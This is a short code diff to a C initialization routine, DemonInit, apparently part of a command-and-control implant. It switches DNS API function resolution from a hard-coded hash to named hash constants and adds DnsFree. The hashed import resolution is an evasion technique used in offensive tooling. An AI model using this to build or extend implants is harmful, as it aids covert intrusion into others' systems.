@@ -814,7 +814,8 @@ VOID DemonInit( VOID )
 
     if ( Instance.Modules.Dnsapi )
     {
-        Instance.Win32.DnsQuery_A = LdrFunctionAddr( Instance.Modules.Dnsapi, 0xeb04a380 );
+        Instance.Win32.DnsQuery_A = LdrFunctionAddr( Instance.Modules.Dnsapi, FuncHash_DnsQuery_A );
+        Instance.Win32.DnsFree    = LdrFunctionAddr( Instance.Modules.Dnsapi, FuncHash_DnsFree );
 
         PUTS( "Loaded DnsApi functions" )
     }
